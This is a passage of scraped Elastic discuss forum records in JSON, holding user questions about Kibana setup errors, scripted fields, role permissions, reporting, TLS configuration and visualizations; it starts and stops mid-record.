    "body": "New to ELK and setting up in rhel 7.5 OS. Kibana is throwing error while setting up on master. Deleted below indices and tried again, but same error. red open .kibana_task_manager_1 jmlrFCiCT-qOt_hsevBM1g 1 1 red open .apm-agent-configuration ugLrtPV6QLmqXwkWXF9oMw 1 1 red open .kibana_1 FbvYSkyoTO-cXVF3DUxUEQ 1 1 Elastic search { \"name\" : \"master-1\", \"cluster_name\" : \"sjc-v2\", \"cluster_uuid\" : \"g-MOWUQGQMmgOUaCP0cdYA\", \"version\" : { \"number\" : \"7.6.2\", \"build_flavor\" : \"default\", \"build_type\" : \"tar\", \"build_hash\" : \"ef48eb35cf30adf4db14086e8aabd07ef6fb113f\", \"build_date\" : \"2020-03-26T06:34:37.794943Z\", \"build_snapshot\" : false, \"lucene_version\" : \"8.4.0\", \"minimum_wire_compatibility_version\" : \"6.8.0\", \"minimum_index_compatibility_version\" : \"6.0.0-beta1\" }, \"tagline\" : \"You Know, for Search\" } Kibana logs log [03:46:58.923] [info][plugins-service] Plugin \"case\" is disabled. log [03:47:03.170] [info][plugins-system] Setting up [37] plugins: [taskManager,siem,licensing,infra,encryptedSavedObjects,code,usageCollection,metrics,canvas,timelion,features,security,apm_oss,translations,reporting,uiActions,data,navigation,status_page,share,newsfeed,kibana_legacy,management,dev_tools,inspector,expressions,visualizations,embeddable,advancedUiActions,dashboard_embeddable_container,home,spaces,cloud,apm,graph,eui_utils,bfetch] log [03:47:03.172] [info][plugins][taskManager] Setting up plugin log [03:47:03.187] [info][plugins][siem] Setting up plugin log [03:47:03.188] [info][licensing][plugins] Setting up plugin log [03:47:03.190] [info][infra][plugins] Setting up plugin log [03:47:03.191] [info][encryptedSavedObjects][plugins] Setting up plugin log [03:47:03.192] [warning][config][encryptedSavedObjects][plugins] Generating a random key for xpack.encryptedSavedObjects.encryptionKey. To be able to decrypt encrypted saved objects attributes after restart, please set xpack.encryptedSavedObjects.encryptionKey in kibana.yml log [03:47:03.197] [info][code][plugins] Setting up plugin log [03:47:03.198] [info][plugins][usageCollection] Setting up plugin log [03:47:03.199] [info][metrics][plugins] Setting up plugin log [03:47:03.200] [info][canvas][plugins] Setting up plugin log [03:47:03.206] [info][plugins][timelion] Setting up plugin log [03:47:03.207] [info][features][plugins] Setting up plugin log [03:47:03.208] [info][plugins][security] Setting up plugin log [03:47:03.209] [warning][config][plugins][security] Generating a random key for xpack.security.encryptionKey. To prevent sessions from being invalidated on restart, please set xpack.security.encryptionKey in kibana.yml log [03:47:03.209] [warning][config][plugins][security] Session cookies will be transmitted over insecure connections. This is not recommended. log [03:47:03.228] [info][apm_oss][plugins] Setting up plugin log [03:47:03.228] [info][plugins][translations] Setting up plugin log [03:47:03.229] [info][data][plugins] Setting up plugin log [03:47:03.234] [info][plugins][share] Setting up plugin log [03:47:03.235] [info][home][plugins] Setting up plugin log [03:47:03.241] [info][plugins][spaces] Setting up plugin log [03:47:03.246] [info][cloud][plugins] Setting up plugin log [03:47:03.247] [info][apm][plugins] Setting up plugin log [03:47:03.251] [info][graph][plugins] Setting up plugin log [03:47:03.253] [info][bfetch][plugins] Setting up plugin log [03:47:03.259] [info][savedobjects-service] Waiting until all Elasticsearch nodes are compatible with Kibana before starting saved objects migrations... log [03:47:03.301] [info][savedobjects-service] Starting saved objects migrations log [03:47:03.312] [info][savedobjects-service] Creating index .kibana_task_manager_1. log [03:47:03.316] [info][savedobjects-service] Creating index .kibana_1. Could not create APM Agent configuration: Request Timeout after 30000ms log [03:47:33.313] [warning][savedobjects-service] Unable to connect to Elasticsearch. Error: Request Timeout after 30000ms log [03:47:35.817] [warning][savedobjects-service] Unable to connect to Elasticsearch. Error: [resource_already_exists_exception] index [.kibana_task_manager_1/6jHlllmtTmGSJI3vco_KJw] already exists, with { index_uuid=\"6jHlllmtTmGSJI3vco_KJw\" & index=\".kibana_task_manager_1\" } log [03:47:35.818] [warning][savedobjects-service] Another Kibana instance appears to be migrating the index. Waiting for that migration to complete. If no other Kibana instance is attempting migrations, you can get past this message by deleting index .kibana_task_manager_1 and restarting Kibana. log [03:47:35.828] [warning][savedobjects-service] Unable to connect to Elasticsearch. Error: [resource_already_exists_exception] index [.kibana_1/xvwnY15cQaStFRV-qjMbaA] already exists, with { index_uuid=\"xvwnY15cQaStFRV-qjMbaA\" & index=\".kibana_1\" } log [03:47:35.829] [warning][savedobjects-service] Another Kibana instance appears to be migrating the index. Waiting for that migration to complete. If no other Kibana instance is attempting migrations, you can get past this message by deleting index .kibana_1 and restarting Kibana.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "c82451ac-98e9-473e-967f-8c47b1da9cac",
    "url": "https://discuss.elastic.co/t/replace-the-kibana-logo/27547",
    "title": "Replace the kibana logo?",
    "category": [
      "Kibana"
    ],
    "author": "allenmchan",
    "date": "August 18, 2015, 3:56am August 18, 2015, 4:50am August 18, 2015, 5:09pm August 18, 2015, 9:44pm August 18, 2015, 11:38pm August 19, 2015, 4:37am August 19, 2015, 11:47am October 5, 2015, 1:53pm November 4, 2015, 2:41pm November 4, 2015, 10:08pm February 16, 2016, 9:15pm March 29, 2016, 6:13pm September 28, 2016, 5:02pm September 28, 2016, 5:53pm September 28, 2016, 6:46pm October 7, 2016, 3:24pm October 20, 2016, 8:38pm October 27, 2016, 1:41pm October 25, 2016, 5:28pm October 26, 2016, 7:59am",
    "body": "Does anyone know if it is possible to replace the kibana logo with my company's logo? Only for corporate use.",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "72bbf385-f583-4e87-bc9a-30f5b793c450",
    "url": "https://discuss.elastic.co/t/scripted-field-no-field-found-on-field-presence-check/228219",
    "title": "Scripted field - \"no field found\" on field presence check",
    "category": [
      "Kibana"
    ],
    "author": "philhagen",
    "date": "April 15, 2020, 11:44pm April 15, 2020, 11:43pm",
    "body": "With a painless scripted field, the recommended field presence logic itself causes a \"No field found\" error, but not on all records - in fact just four of ~930k fail with the error (below). { \"took\": 6, \"timed_out\": false, \"_shards\": { \"total\": 73, \"successful\": 72, \"skipped\": 0, \"failed\": 1, \"failures\": [ { \"shard\": 0, \"index\": \"netflow-2018.07.06\", \"node\": \"biwB6-HEQCC5kTcwa4AAEw\", \"reason\": { \"type\": \"script_exception\", \"reason\": \"runtime error\", \"script_stack\": [ \"org.elasticsearch.search.lookup.LeafDocLookup.get(LeafDocLookup.java:94)\", \"org.elasticsearch.search.lookup.LeafDocLookup.get(LeafDocLookup.java:41)\", \"if ( doc['destination_geo.asn'].size() == 0 || doc['destination_geo.as_org.keyword'].size() == 0 ) { \", \" ^---- HERE\" ], \"script\": \"if ( doc['destination_geo.asn'].size() == 0 || doc['destination_geo.as_org.keyword'].size() == 0 ) { return 'ASN: Not Available' } else { return 'ASN' + doc['destination_geo.asn'].value + ': ' + doc['destination_geo.as_org.keyword'].value }\", \"lang\": \"painless\", \"caused_by\": { \"type\": \"illegal_argument_exception\", \"reason\": \"No field found for [destination_geo.asn] in mapping with types []\" } } } ] }, \"hits\": { \"total\": 4, \"max_score\": null, \"hits\": [] } } However, for many other other documents that do not have a destination_geo.asn field, the scripted field as stated above works properly. I experimented with using doc.containsKey() as indicated here. The four failing records work fine with this function but all other records missing a destination_geo.asn field fail.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c431445e-6336-4eee-98a4-012dbfafbdc1",
    "url": "https://discuss.elastic.co/t/limited-access-user-role-kibana-user-can-still-manage-spaces/227616",
    "title": "Limited access user : role 'kibana_user' can still manage spaces",
    "category": [
      "Kibana"
    ],
    "author": "laurentml",
    "date": "April 12, 2020, 10:30am April 13, 2020, 8:17pm April 13, 2020, 9:45pm April 13, 2020, 10:31pm April 14, 2020, 4:52pm April 15, 2020, 7:50pm April 15, 2020, 8:56pm April 15, 2020, 9:51pm",
    "body": "Hi all, and thx a lot for those wonderful ELK tools. I'm trying to configure a limited-access user, able to only create visualizations for a given space, limited to a specific index, with ELK 7.6.0. User shall not be able to change data itself nor Kibana config, just use it to produce visualization, dashboards and discover data. index : 'lolo' space 'lolo' : show only discover, visualize, dashboard features role 'lolo_role' : index privileges : index : 'lolo' => read, view_index_metadata index: '.kibana*' => read, view_index_metadata space privileges : space 'lolo': 'all' to discover,visualize,dashboard, none otherwise user 'Laurent' : Roles : 'lolo_role', 'kibana_user' Problem : This user has still access to the 'Management/Kibana/Spaces' menu and is free to do whatever he wants there (create/delete spaces), while I was expecting this menu to be disabled or hidden in such case. Same config but when removing the 'kibana_user' from user roles, works fine for discover, except that I get 2 error messages when consulting data : -> `Unable to update UI setting : Request failed with status code: 403` -> `Error fetching fields for index pattern lolo : Forbidden'` but it can still show index contents however. Is there anything I misunderstand, some additional access rights I shall assign to the .kibana indices for my role ? Moreover, 'kibana_user' is marked has being deprecated in documentation : https://www.elastic.co/guide/en/elasticsearch/reference/current/built-in-roles.html Using 'kibana_admin' leads to same effect, which then make me think that there might be a 'read-only' user and/or 'use -but-don't-admin' user missing in kibana documentation ? Thanks!",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "0eb2ea6e-3ed8-4b3f-8fbc-331565215471",
    "url": "https://discuss.elastic.co/t/year-over-year-calculations/227559",
    "title": "Year over Year Calculations",
    "category": [
      "Kibana"
    ],
    "author": "dmankaruse",
    "date": "April 10, 2020, 8:48pm April 15, 2020, 8:10am April 15, 2020, 4:25pm April 15, 2020, 4:29pm April 15, 2020, 5:58pm",
    "body": "I am trying to create a report with year over year calculations, I want to show to sum of activity in Jan 2020, and compare that with the sum of Jan 2019, I wish to display this is a numeric value of the difference, and show the percent change, how can I do this?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "fda70fc9-3d25-4180-a60c-3169ad5a0e91",
    "url": "https://discuss.elastic.co/t/getting-headlesserror-econnrefused-when-trying-to-generate-pdf-report-from-kibana/222773",
    "title": "Getting HeadlessError: ECONNREFUSED when trying to generate PDF report from Kibana",
    "category": [
      "Kibana"
    ],
    "author": "preetish_P",
    "date": "March 9, 2020, 5:43pm March 12, 2020, 3:40pm March 19, 2020, 12:42pm April 8, 2020, 1:00pm April 15, 2020, 11:23am April 15, 2020, 5:32pm",
    "body": "Hi Team, I am trying to generate PDF reports on Kibana and while doing so I am getting the below error: HeadlessError: Request() error evaluating createPage() call: Error: connect ECONNREFUSED 127.0.0.1:33395 We are running all 3 components of ELK stack(v6.8) on the same LPAR (hence firewall issues out of question?) I followed various remedies mentioned in forums. I have added correct values for below parameters in kibana.yml : xpack.reporting.kibanaServer.port : xpack.reporting.kibanaServer.hostname : server.ssl.enabled: true server.ssl.certificate: server.ssl.key: elasticsearch.ssl.certificateAuthorities: xpack.reporting.encryptionKey: xpack.security.encryptionKey: After triggering PDF generation, I checked for the phantomjs process which is spawned: /var/lib/kibana/phantomjs-2.1.1-linux-x86_64/bin/phantomjs --load-images=true --ssl-protocol=any --ignore-ssl-errors=true /usr/share/kibana/node_modules/@elastic/node-phantom-simple/bridge.js 127.0.0.1 33761 I cannot understand why the phantomjs process is still picking up localhost. I looked for all settings, but could not understand what decides the host (A random port is used for every attempt I believe) Can you please suggest, what I am missing here.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "abfb7b87-d5ae-41ca-94ec-24e6b0d5e9f2",
    "url": "https://discuss.elastic.co/t/display-minimum-count-of-unique-count-field/225753",
    "title": "Display Minimum Count of Unique Count Field",
    "category": [
      "Kibana"
    ],
    "author": "uklipse",
    "date": "March 30, 2020, 9:17pm March 31, 2020, 4:31pm April 2, 2020, 2:59pm April 15, 2020, 3:56pm April 15, 2020, 5:08pm",
    "body": "I've calculated unique counts for a dataset but I'd like to only display when those counts are above a certain number. On regular fields I would use {\"min_doc_count\": 13} under the Json input but on unique counts I get an error. Is there a way to limit the number that is returned? Also if you know how to include fields with missing values into the unique count, I'd be appreciative.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b748a16b-8532-4a54-ad38-c6361379694d",
    "url": "https://discuss.elastic.co/t/unable-to-reindex-security6/227345",
    "title": "Unable to reindex .security6",
    "category": [
      "Kibana"
    ],
    "author": "Chris_Wilmott",
    "date": "April 9, 2020, 2:29pm April 10, 2020, 12:46am April 15, 2020, 4:59pm",
    "body": "Hi, I am trying to upgrade Kibana from 6.8.8 to 7.6.2 but when I am trying to reindex .security6 I get the following error: You do not have sufficient privileges to reindex this index I am logged in as an Admin when performing the upgrade and have been able to successfully reindex this in a test deployment cloned from production. Prior to this I upgraded from 5.6 to 6.8.8 and because .security6 was created in version 5.6 it needs to be reindex. Does anyone know how to resolve this? Cheers.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e2f158ac-2eac-4189-a198-bdba5050554d",
    "url": "https://discuss.elastic.co/t/variables-in-canvas/228073",
    "title": "Variables in Canvas",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 15, 2020, 9:44am April 15, 2020, 4:22pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d6ff6c52-96d6-440a-8a7c-3650e71d9865",
    "url": "https://discuss.elastic.co/t/delete-old-indexes/226933",
    "title": "Delete old indexes",
    "category": [
      "Kibana"
    ],
    "author": "cyberzlo",
    "date": "April 7, 2020, 3:20pm April 8, 2020, 6:55am April 9, 2020, 1:10am April 9, 2020, 6:09am April 9, 2020, 8:41pm April 10, 2020, 7:59am April 11, 2020, 12:15am April 11, 2020, 1:44am April 11, 2020, 10:16am April 15, 2020, 3:29pm",
    "body": "My indexes are created every day like xxx-yy-mm-dd, how can I automatic remove old indexes? I am looking for some easy way, because whole is generated automatic by tshark. To be honest I tried with index templates to add index lifecycle policy but I don't understand a lot options :(… I just wan't delete oldest than 30days or when there will be no space on HDD etc. By default oldest indexes are removed when there is no HDD or what will happen?",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "f343604e-cef4-410b-88a1-dada28c182f6",
    "url": "https://discuss.elastic.co/t/allow-visible-hide-value-in-kibana-dashboard/228125",
    "title": "Allow Visible/Hide value in Kibana dashboard",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 15, 2020, 12:45pm April 15, 2020, 12:58pm April 15, 2020, 2:21pm April 15, 2020, 3:12pm April 15, 2020, 3:24pm April 20, 2020, 8:34pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "1cf509c7-cd97-41ba-83fe-f62e2bdbca57",
    "url": "https://discuss.elastic.co/t/extract-certain-watcher-fields/227751",
    "title": "Extract certain watcher fields",
    "category": [
      "Kibana"
    ],
    "author": "Alexandros888",
    "date": "April 13, 2020, 9:41am April 13, 2020, 4:39pm April 15, 2020, 12:52pm April 15, 2020, 3:20pm",
    "body": "Hello, In this elastic search link: https://www.elastic.co/guide/en/watcher/2.3/input.html#input-search it specifies how to get a field value from a particular hit and it provides an example if we want to get the value of message field from the first hit (see image below). image884×448 45.9 KB That is clear. Nevertheless if i do not want the message field only from the first hit but i want the message field from all hits what should i enter instead of 0 ??? (see image again number 2) Thank you",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "608b80e8-8a09-4d46-9ca7-f66bc968772d",
    "url": "https://discuss.elastic.co/t/multiple-kibana-logs-settings/228082",
    "title": "Multiple Kibana Logs settings",
    "category": [
      "Kibana"
    ],
    "author": "laurentiusoica",
    "date": "April 15, 2020, 10:17am April 15, 2020, 2:14pm April 15, 2020, 2:39pm",
    "body": "Hi, I use elastic stack as a log aggregator for a k8s cluster. I'm creating a separate index from filebeat for each namespace in the cluster for multiple reasons, one of them being to speed up search on a specific namespace. I'm relying on the Kibana Logs feature for log tailing. In order to switch from one index (corresponding to a namespace) to another, I need to change the Logs settings. It implies that only one namespace (so a single user, as long as it's not the same index that it's used for troubleshooting) can concurrently use the Kibana Logs. Is there a way to have multiple settings for kibana Logs feature ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "af1f7839-7988-4134-b5ef-3fc8269655d4",
    "url": "https://discuss.elastic.co/t/api-to-backup-and-restore-settings-from-infrastructure-and-metric-explorer-apps/228024",
    "title": "API to backup and restore settings from Infrastructure and Metric Explorer apps",
    "category": [
      "Kibana"
    ],
    "author": "johncollaros",
    "date": "April 15, 2020, 3:48am April 15, 2020, 2:34pm",
    "body": "Hi, I have noticed there are settings for the Infrastructure app, particularly in the metric explorer where you can save and load views. How can we backup and restore these settings, and export them and import via API? John",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b596c00d-59b6-4b9b-8b36-9bd254044737",
    "url": "https://discuss.elastic.co/t/how-to-replace-no-results-found-with-other-words-or-emoji/228050",
    "title": "How to replace \"No results found\" with other words or emoji",
    "category": [
      "Kibana"
    ],
    "author": "janefeng",
    "date": "April 15, 2020, 7:59am April 15, 2020, 8:45am April 15, 2020, 11:03am April 15, 2020, 11:34am April 15, 2020, 2:24pm April 15, 2020, 2:28pm",
    "body": "Is it possible to replace \"No results found\" in dashboard with other words or emoji? Even if a picture is better.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "909e8ca3-0135-47ef-b37d-31609f7a7e61",
    "url": "https://discuss.elastic.co/t/curl-x-get-url-is-not-working-from-bash-script-for-checking-kibana-installation-with-nginx/228041",
    "title": "CURL -X GET <url> is not working from bash script for checking Kibana installation with Nginx",
    "category": [
      "Kibana"
    ],
    "author": "manojkrishna561994",
    "date": "April 15, 2020, 6:55am April 15, 2020, 2:19pm",
    "body": "Hi, I'm installing ELK stack on my Ubuntu VM using bash script I have made. I'm following this tutorial Install ELK on Ubuntu. After installing Nginx from this tutorial, I'm trying to hit curl -X GET http://server-ip/status from my bash script which is giving me 502 Bad Gateway. However, when i'm doing manual installation or when i'm normally hitting it from terminal, it is giving me the result for that url. Is this expected behaviour? or Does Nginx server takes time to reflect the changes?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "0bcd8a44-e0a0-4b5a-82b0-4d99c358063a",
    "url": "https://discuss.elastic.co/t/xml2js-files-empty-in-node-modules-kibana-7-6-0/228057",
    "title": "\"xml2js\" files empty in node_modules kibana 7.6.0",
    "category": [
      "Kibana"
    ],
    "author": "prernarana",
    "date": "April 15, 2020, 8:18am April 15, 2020, 1:45pm",
    "body": "I am developing a kibana app plugin and using xml2js module in it. When I am integrating it in release version of Kibana, it is failing as required node modules \"xml2js\" and its dependencies \"xmlbuilder\" and \"sax\" exists but files are empty. Files are there but content is empty and that is why its breaking. eg. kibana-7.6.0-windows-x86_64\\kibana-7.6.0-windows-x86_64\\node_modules\\xml2js\\lib\\builder.js kibana-7.6.0-windows-x86_64\\kibana-7.6.0-windows-x86_64\\node_modules\\xml2js\\lib\\xml2.js all the files are empty. error: error [07:42:35.906] TypeError: _xml2js.default.Builder is not a constructor at generatePayload (C:\\Users\\e00990\\Desktop\\kibana-7.6.0-windows-x86_64\\kibana-7.6.0-windows-x86_64\\plugins\\mdn_locate_plugin\\server\\routes/routes.js:203:21) at handler (C:\\Users\\e00990\\Desktop\\kibana-7.6.0-windows-x86_64\\kibana-7.6.0-windows-x86_64\\plugins\\mdn_locate_plugin\\server\\routes/routes.js:10:23) at module.exports.internals.Manager.execute (C:\\Users\\e00990\\Desktop\\kibana-7.6.0-windows-x86_64\\kibana-7.6.0-windows-x86_64\\node_modules\\hapi\\lib\\toolkit.js:35:106) at Object.internals.handler (C:\\Users\\e00990\\Desktop\\kibana-7.6.0-windows-x86_64\\kibana-7.6.0-windows-x86_64\\node_modules\\hapi\\lib\\handler.js:50:48) at exports.execute (C:\\Users\\e00990\\Desktop\\kibana-7.6.0-windows-x86_64\\kibana-7.6.0-windows-x86_64\\node_modules\\hapi\\lib\\handler.js:35:36) at Request._lifecycle (C:\\Users\\e00990\\Desktop\\kibana-7.6.0-windows-x86_64\\kibana-7.6.0-windows-x86_64\\node_modules\\hapi\\lib\\request.js:263:62) Is it a bug ? Is there any command that will update these packages with valid file content? Note: I tried by replacing xml2js, xmlbuilder and sax modules with valid file contents and code worked but I do not want to manual update.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "1284fafa-7362-4112-8191-bb8a8934aa84",
    "url": "https://discuss.elastic.co/t/get-ratio-of-daily-active-users-and-montly-active-users/228127",
    "title": "Get Ratio of Daily Active Users and Montly Active Users",
    "category": [
      "Kibana"
    ],
    "author": "Julius_Kukonenko",
    "date": "April 15, 2020, 12:55pm April 15, 2020, 1:45pm April 15, 2020, 1:45pm",
    "body": "Hi, im new to kibana and trying to figure it out how to make calculation of already filtered documents. For example, I need to count a ratio of my Daily Active Users and my Monthly Active Users. So I need to make two querries that filters out DAU and MAU and then I need to divide those numbers. Already read a lot of articles of Scripted fields, but could not find an answer how to make such thing. Or maybe it is impossible to do that with Kibana?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a61cded5-d329-47a8-921b-206bb03b80d4",
    "url": "https://discuss.elastic.co/t/control-visualization-not-rendering-according-to-filter/228108",
    "title": "Control Visualization Not rendering according to filter",
    "category": [
      "Kibana"
    ],
    "author": "abhishek.pailwan",
    "date": "April 15, 2020, 11:53am April 15, 2020, 1:20pm",
    "body": "Control Visualization in kibana is not able to render with add filter command. As i added add filter option in visualization and after that created 2-3 controls which are parent children control. and i am unable to get only those values in first control which i must have to come when i use add filter. Example - I have to select districts from state so i added add filter option on top of the visualization as state = Maharashtra so i am able to get only those districts which are available in Maharashtra for the first control which is parent control for all. but i am getting all the values which do not belongs to Maharashtra. So can someone help me in that?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "100cf512-04d5-4b9f-bf3f-cf5e680a2497",
    "url": "https://discuss.elastic.co/t/kibana-tls-settings-using-server-ssl-keystore-path-not-working/228065",
    "title": "Kibana TLS settings using \"server.ssl.keystore.path\" not working",
    "category": [
      "Kibana"
    ],
    "author": "Manjula_Piyumal",
    "date": "April 15, 2020, 9:30am April 15, 2020, 10:20am April 15, 2020, 1:15pm",
    "body": "Hi, I was trying to set up TLS for kibana (v-7.4.2) using a keystore. I have configured the keystore using \"server.ssl.keystore.path\" and \"server.ssl.keystore.password\" as per this - https://www.elastic.co/guide/en/kibana/current/configuring-tls.html However, am getting \"FATAL Error: [server.ssl.keystore]: definition for this key is missing\" error while starting the Kibana. I have tried to extract the key and certs from the same keystore and configured them seperately using \"server.ssl.certificate\" and \"server.ssl.key\" properties and it was working fine. Did I miss anything in my keystore based configuration? Would like to use the keystore based configuration instead of keeping key and cert separately. Appreciate any inputs to understand what went wrong. Thanks in advance",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2663f783-409e-47ad-a7d1-936c42730b21",
    "url": "https://discuss.elastic.co/t/customize-kibana-selection-options/227997",
    "title": "Customize Kibana Selection Options",
    "category": [
      "Kibana"
    ],
    "author": "jeffzhao",
    "date": "April 14, 2020, 9:02pm April 14, 2020, 10:20pm April 15, 2020, 1:10pm",
    "body": "Hi, Is it possible to hide or remove some of the selection options in Kibana UI? I particularly want to do this with the time-filter. Because our Elasticsearch index is huge including 5-years of historical data. But I only want the user to query no more than 1-year of data. Otherwise their search requests can blow up our Elasticsearch cluster. How can I hide or remove the option \"Last 2 years\" or \"Last 5 years\" from the UI?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b668bbfb-d2bb-4890-b0b0-37f785e36091",
    "url": "https://discuss.elastic.co/t/why-library-files-of-node-modules-dependencies-are-empty-in-release-version-of-kibana/228076",
    "title": "Why library files of node modules dependencies are empty in release version of Kibana",
    "category": [
      "Kibana"
    ],
    "author": "pranay_bhatnagar",
    "date": "April 15, 2020, 10:47am April 15, 2020, 12:14pm April 15, 2020, 12:25pm",
    "body": "I want to know why library files of node modules are empty of some external dependencies. I am placing the build of my plugin inside plugin folder in release version of Kibana and running it but the dependencies are not working inside Kibana and throwing error of dependency not defined. I am using xml2js dependency in my plugin but it is throwing error but when i am working in development version it is working fine but when placing the plugin folder in the Kibana release version it is throwing error. kibana-7.6.0-windows-x86_64\\kibana-7.6.0-windows-x86_64\\node_modules\\xml2js\\lib\\xml2.js",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0e8a116e-f9ee-49c3-acfe-692458b9cf92",
    "url": "https://discuss.elastic.co/t/introduce-bucket-selector-or-any-post-aggregation-filtering-like-having-in-sql-into-region-map-elastic-search-kibana/227687",
    "title": "Introduce bucket-selector or any post-aggregation filtering(like having in sql) into region map elastic-search/kibana",
    "category": [
      "Kibana"
    ],
    "author": "sleshJdev",
    "date": "April 12, 2020, 5:04pm April 14, 2020, 3:07pm April 14, 2020, 10:27pm April 15, 2020, 11:51am",
    "body": "I have tabular data by districts and days. Each row contains diff between the current and previous days, i.e. relative value. district | day | metric ----------+------------+-------- D1 | 2020-04-12 | -11 D1 | 2020-04-13 | 40 D2 | 2020-04-13 | 20 D1 | 2020-04-14 | 11 D1 | 2020-04-15 | -50 I need to visualize this data on Kibana's region map. So, the metric is grouped by district and summarized. Here is the ElasticSearch query generated by Kibana: {\"aggs\": { \"2\": { \"terms\": { \"field\": \"district\", \"size\": 300, \"order\": { \"1\": \"desc\" }}, \"aggs\": { \"1\": { \"sum\": { \"field\": \"metric\" }}}}}, \"query\": { \"bool\": { \"must\": [{ \"range\": { \"@timestamp\": { \"format\": \"strict_date_optional_time\", \"gte\": \"2020-04-12T00:00:00.0Z\", \"lte\": \"2020-04-16T00:00:00.0Z\" }}}]}}} Depending on the selected data rage the result will vary. For example, this query selects all data (see @timestamp filter) and metric values for districts D1 and D2 will be -10 and 20. If I'll change the filter to select data for 12-13 April it will be -11 + 40 = 29 for D1 and 20 for D2. In Kibana I need to filter out buckets with negative sum(metric) value and show districts only with a positive sum value. I couldn't find any working solution. I've tried Kibana's JSON input + Bucket Selector Aggregation Visual Kibana's Vega Graphs, but it seems that it doesn't support region maps. I'd like to avoid it as it's quite complicated. Build a new index based on the existing ones, but it's not possible as a result depends on a date range filter, so I cannot pre-calculate metrics and filter out negatives because I don't know what date range is in advanced Nothing of this worked for me. I was able to compose a working Elastic Search query that does exactly what I want, but I don't know how to visualize it using the region map: {\"aggs\": { \"2\": { \"terms\": { \"field\": \"district\", \"size\": 300, \"order\": { \"1\": \"desc\" }}, \"aggs\": { \"1\": { \"sum\": { \"field\": \"metric\" }, \"1_bucket_selector\": { -- here is main part, how get it in region map? \"bucket_selector\": { \"buckets_path\": { \"metricSum\": \"1\" }, \"script\": \"params.metricSum > 0\" }}}}}}} So, any workaround to achieve what I want? Here is related topic on SO",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "10374d26-27d0-4ad6-b4ac-93ebd53ad888",
    "url": "https://discuss.elastic.co/t/is-there-a-way-to-use-mouse-hover-or-click-when-using-image-type-for-url-in-scripted-field/222114",
    "title": "Is there a way to use mouse hover or click when using Image type for Url in Scripted field",
    "category": [
      "Kibana"
    ],
    "author": "nielarshi",
    "date": "March 4, 2020, 4:26pm March 12, 2020, 12:27pm April 7, 2020, 3:34pm April 15, 2020, 11:24am",
    "body": "I have got images to show different statuses using URL type Image. It shows different images when a list is passed. However, can a link be assigned to these images to enable click to an external link or can a mouse hover to a tooltip be assigned so that it is easy to know details.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1e2c644a-4dac-44d8-a36b-123402d44e01",
    "url": "https://discuss.elastic.co/t/general-question-about-kibana-vega-widgets-text-box/227864",
    "title": "General Question about KIBANA - VEGA WIDGETS (text box)",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 14, 2020, 7:42am April 15, 2020, 8:44am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "fce9b4fe-a597-4e40-a9e6-064d3ef9388e",
    "url": "https://discuss.elastic.co/t/set-href-query-string-in-vega/227395",
    "title": "Set Href Query String in Vega",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 9, 2020, 7:12pm April 13, 2020, 3:07pm April 15, 2020, 8:33am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8ce0cd38-6169-4771-aa18-197e3794186a",
    "url": "https://discuss.elastic.co/t/show-number-of-servers-with-a-number-of-uniques-ids-reporting/227527",
    "title": "Show number of servers with a number of uniques IDs reporting",
    "category": [
      "Kibana"
    ],
    "author": "tisiman",
    "date": "April 10, 2020, 3:29pm April 15, 2020, 7:26am",
    "body": "I have an X number of records like: { server: 1, ID: A1X, @timestamp: \"2018-12-28 09:00\"} { server: 1, ID: A2X, @timestamp: \"2018-12-28 09:00\"} { server: 1, ID: A3X, @timestamp: \"2018-12-28 09:00\"} { server: 2, ID: B1X, @timestamp: \"2018-12-28 09:00\"} { server: 3, ID: C1X, @timestamp: \"2018-12-28 09:00\"} { server: 3, ID: C2X, @timestamp: \"2018-12-28 09:00\"} { server: 4, ID: D1X, @timestamp: \"2018-12-28 09:00\"} { server: 1, ID: A1X, @timestamp: \"2018-12-28 10:00\"} { server: 1, ID: A3X, @timestamp: \"2018-12-28 10:00\"} { server: 2, ID: B1X, @timestamp: \"2018-12-28 10:00\"} { server: 3, ID: C1X, @timestamp: \"2018-12-28 10:00\"} { server: 4, ID: D1X, @timestamp: \"2018-12-28 10:00\"} Waht I would like to show in Bargraph (or Pie) is how many servers have X number of IDs reporting. IDs are not reporting every timestamp. IDs are unique Hash Valiues in Real. The number of servers is about 1000. Result should be 1 Server with 3 IDs (Server 1) 1 Server with 2 IDs (Server 3) 2 Servers with 1 IDs (Server 2 and 4) So I should be able to stack Unique Count on top of Unique Count. Any advice on how to do this? Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "03865cf1-6088-4e7a-ad50-1c53e696fcaf",
    "url": "https://discuss.elastic.co/t/while-concatenating-two-large-text-field-using-scripted-field-if-string-length-are-long-not-able-to-concatenate/227905",
    "title": "While concatenating two large text field using scripted field, if string length are long not able to concatenate",
    "category": [
